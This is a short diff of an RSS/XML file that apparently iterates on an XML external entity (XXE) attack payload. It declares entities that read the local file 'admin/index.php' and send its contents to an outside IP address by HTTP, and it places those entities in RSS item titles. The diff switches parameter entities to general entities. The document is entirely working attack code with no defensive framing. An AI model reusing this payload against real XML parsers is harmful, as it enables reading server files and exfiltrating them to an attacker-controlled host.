@@ -9,16 +9,17 @@
         </item>
     </channel>
 </rss> -->
+
 <!DOCTYPE root[
-<!ENTITY % file SYSTEM "file://admin/index.php">
-<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://104.131.23.191/index.php?file=%file;'>">
+    <!ENTITY file SYSTEM "file://admin/index.php">
+    <!ENTITY int "<!ENTITY &#37; send SYSTEM 'http://104.131.23.191/index.php?file=%file'>">
 ]>
 <rss xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" version="2.0">
     <channel>
         <title>Categories actualiteSupelec Com</title>
         <item>
-            <title>%int;</title>
-            <title>%send;</title>
+            <title>&int;</title>
+            <title>&send;</title>
         </item>
     </channel>
 </rss>
